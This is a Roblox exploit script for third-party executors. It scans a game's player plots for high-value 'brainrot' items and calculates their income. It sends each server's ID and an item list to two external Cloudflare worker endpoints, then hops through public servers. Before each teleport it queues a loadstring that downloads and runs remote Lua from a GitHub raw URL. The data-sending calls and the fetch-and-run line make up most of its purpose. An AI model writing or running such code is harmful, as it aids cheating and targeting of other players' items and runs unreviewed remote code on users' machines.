print("[DEBUG] Script Alive!")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local lp = Players.LocalPlayer
repeat task.wait() until lp

local CLOUDFLARE_WORKER = "https://free-links.servruntime.workers.dev/"
local HIGH_VALUE_WORKER = "https://roredirect.servruntime.workers.dev/"
local HIGH_INCOME_THRESHOLD = 10000000

local specialBrainrots = {
    ["La Grande Combinasion"] = true,
    ["Los 25"] = true,
    ["Mariachi Corazoni"] = true,
    ["Swag Soda"] = true,
    ["Chimnino"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Los Combinasionas"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Fishino Clownino"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Las Sis"] = true,
    ["Los Planitos"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["Los Hotspotsitos"] = true,
    ["Money Money Puggy"] = true,
    ["Los Mobilis"] = true,
    ["Los 67"] = true,
    ["Celularcini Viciosini"] = true,
    ["Los Candies"] = true,
    ["La Extinct Grande"] = true,
    ["Los Bros"] = true,
    ["La Spooky Grande"] = true,
    ["Chillin Chili"] = true,
    ["Chipso and Queso"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Tralaledon"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["Los Puggies"] = true,
    ["La Jolly Grande"] = true,
    ["Esok Sekolah"] = true,
    ["Los Primos"] = true,
    ["Eviledon"] = true,
    ["Los Tacoritas"] = true,
    ["Tang Tang Keletang"] = true,
    ["La Taco Combinasion"] = true,
    ["Ketupat Kepat"] = true,
    ["Tictac Sahur"] = true,
    ["La Supreme Combinasion"] = true,
    ["Orcaledon"] = true,
    ["Swaggy Bros"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Lavadorito Spinito"] = true,
    ["Garama and Madundung"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Los Spaghettis"] = true,
    ["La Ginger Sekolah"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["La Secret Combinasion"] = true,
    ["Reinito Sleighito"] = true,
    ["Burguro and Fryuro"] = true,
    ["Cooki and Milki"] = true,
    ["Capitano Moby"] = true,
    ["Headless Horseman"] = true,
    ["Dragon Cannelloni"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true
}

local queue = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
if type(queue) ~= "function" then queue = nil end

local brainrots = {}
for name,_ in pairs(specialBrainrots) do table.insert(brainrots,name) end

local BaseIncome = {["La Grande Combinasion"]=10000000,["Los 25"]=10000000,["Mariachi Corazoni"]=12500000,
["Swag Soda"]=10000000,["Chimnino"]=10000000,["Nuclearo Dinossauro"]=15000000,["Los Combinasionas"]=63700000,
["Chicleteira Noelteira"]=15000000,["Fishino Clownino"]=10000000,["Tacorita Bicicleta"]=16500000,
["Las Sis"]=17500000,["Los Planitos"]=10000000,["Los Spooky Combinasionas"]=20000000,
["Los Hotspotsitos"]=20000000,["Money Money Puggy"]=21000000,["Los Mobilis"]=20000000,
["Los 67"]=22500000,["Celularcini Viciosini"]=22500000,["Los Candies"]=20000000,
["La Extinct Grande"]=23500000,["Los Bros"]=20000000,["La Spooky Grande"]=20000000,
["Chillin Chili"]=30000000,["Chipso and Queso"]=20000000,["Mieteteira Bicicleteira"]=20000000,
["Tralaledon"]=27500000,["Gobblino Uniciclino"]=20000000,["W or L"]=20000000,
["Los Puggies"]=20000000,["La Jolly Grande"]=30000000,["Esok Sekolah"]=30000000,
["Los Primos"]=20000000,["Eviledon"]=20000000,["Los Tacoritas"]=32000000,["Tang Tang Keletang"]=33500000,
["La Taco Combinasion"]=20000000,["Ketupat Kepat"]=35000000,["Tictac Sahur"]=37500000,
["La Supreme Combinasion"]=40000000,["Orcaledon"]=20000000,["Swaggy Bros"]=20000000,
["Ketchuru and Musturu"]=42500000,["Lavadorito Spinito"]=20000000,["Garama and Madundung"]=50000000,
["Spaghetti Tualetti"]=60000000,["Los Spaghettis"]=50000000,["La Ginger Sekolah"]=50000000,
["Spooky and Pumpky"]=50000000,["Fragrama and Chocrama"]=100000000,["La Casa Boo"]=100000000,
["La Secret Combinasion"]=125000000,["Reinito Sleighito"]=100000000,["Burguro and Fryuro"]=150000000,
["Cooki and Milki"]=155000000,["Capitano Moby"]=150000000,["Headless Horseman"]=150000000,
["Dragon Cannelloni"]=250000000,["Strawberry Elephant"]=500000000,["Meowl"]=400000000}

local TraitMultiplier = {Sleepy=0.5,Wet=1.5,Snowy=3,Taco=3,UFO=4,Cometstruck=3.5,Bubblegum=4,["Shark Fin"]=3,
["10B"]=4,["Witch Hat"]=4.5,Skeleton=5,Explosive=4,Galactic=3,Spider=4.5,["RIP Gravestone"]=5,
["Matteo Hat"]=3.5,Tie=4.75,Glitched=5,["Santa Hat"]=5,Indonesia=5,Claws=5,Disco=5,Zombie=5,
Sombrero=5,["Jackolantern Pet"]=5,Fireworks=6,Brazil=6,Nyan=6,Lightning=6,Paint=6,Fire=6,Meowl=7,Strawberry=8}
local MutationMultiplier={Gold=1.25,Diamond=1.5,Bloodrot=2,Candy=4,Lava=6,Galaxy=7,["Yin Yang"]=7.5,Radioactive=8.5,Rainbow=10}

local function getAttr(model,name)
    local v=model:GetAttribute(name)
    if v~=nil then return v end
    if model.PrimaryPart then
        v=model.PrimaryPart:GetAttribute(name)
        if v~=nil then return v end
    end
    return nil
end

local function sumTraits(model)
    local s,f=0,false
    for attr,v in pairs(model:GetAttributes()) do if string.sub(attr,1,5)=="Trait" then s+=TraitMultiplier[v] or 0 f=true end end
    if model.PrimaryPart then for attr,v in pairs(model.PrimaryPart:GetAttributes()) do if string.sub(attr,1,5)=="Trait" then s+=TraitMultiplier[v] or 0 f=true end end end
    return f and s or 1
end

local function getMutationMultiplier(model)
    local mut=getAttr(model,"Mutations") or getAttr(model,"Mutation") or getAttr(model,"mutation")
    return MutationMultiplier[mut] or 1
end

local function getBaseIncome(name) return BaseIncome[name] or 1 end
local function calculateIncome(model) return getBaseIncome(model.Name)*sumTraits(model)*getMutationMultiplier(model) end

local function scanServer()
    local plots=Workspace:FindFirstChild("Plots")
    if not plots then return {} end
    local found,seen={},{}
    for _,obj in ipairs(plots:GetDescendants()) do
        if obj:IsA("Model") and not seen[obj.Name] and BaseIncome[obj.Name] then
            local income=calculateIncome(obj)
            local traits={}
            for attr,v in pairs(obj:GetAttributes()) do if string.sub(attr,1,5)=="Trait" then table.insert(traits,v) end end
            if obj.PrimaryPart then for attr,v in pairs(obj.PrimaryPart:GetAttributes()) do if string.sub(attr,1,5)=="Trait" then table.insert(traits,v) end end end
            found[#found+1]={name=obj.Name,income=income,traits=#traits>0 and table.concat(traits,"+") or "NoTraits",mutation=getMutationMultiplier(obj)>1 and "Mutation" or "NoMutation"}
            seen[obj.Name]=true
        end
    end
    return found
end

local function sendPayload(workerUrl,entries)
    if #entries==0 then return end
    local lines={}
    for _,e in ipairs(entries) do lines[#lines+1]=string.format("%s = %d/s [%s][%s]",e.name,math.floor(e.income),e.traits,e.mutation) end
    local url=string.format("%s?place=%s&job=%s&brainrots=%s",workerUrl,game.PlaceId,game.JobId,HttpService:UrlEncode(table.concat(lines,", ")))
    pcall(function() if syn then syn.request({Url=url,Method="GET"}) else game:HttpGet(url) end end)
end

getgenv()._brainrotReported=getgenv()._brainrotReported or {}
local found=scanServer()
if #found>0 and not getgenv()._brainrotReported[game.JobId] then
    getgenv()._brainrotReported[game.JobId]=true
    local normal,high={},{}
    for _,e in ipairs(found) do if specialBrainrots[e.name] or e.income>=HIGH_INCOME_THRESHOLD then high[#high+1]=e else normal[#normal+1]=e end end
    sendPayload(CLOUDFLARE_WORKER,normal)
    sendPayload(HIGH_VALUE_WORKER,high)
end

local function hopServer()
    local currentJob=game.JobId
    local nextCursor=""
    while true do
        local ok,res=pcall(function()
            local url=("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100%s"):format(game.PlaceId,nextCursor~="" and "&cursor="..nextCursor or "")
            return HttpService:JSONDecode(game:HttpGet(url))
        end)
        if not ok or not res or not res.data then task.wait(0.5) else
            nextCursor=res.nextPageCursor or ""
            for _,server in ipairs(res.data) do
                if server.playing<server.maxPlayers and server.id~=currentJob then
                    if queue then queue("loadstring(game:HttpGet('https://raw.githubusercontent.com/hazel-solarisproject/actualdeploy/main/purelyraw.lua'))()") end
                    pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId,server.id,lp) end)
                    task.wait(1)
                    break
                end
            end
            if nextCursor=="" then nextCursor="" end
        end
        task.wait(0.25)
    end
end

hopServer()
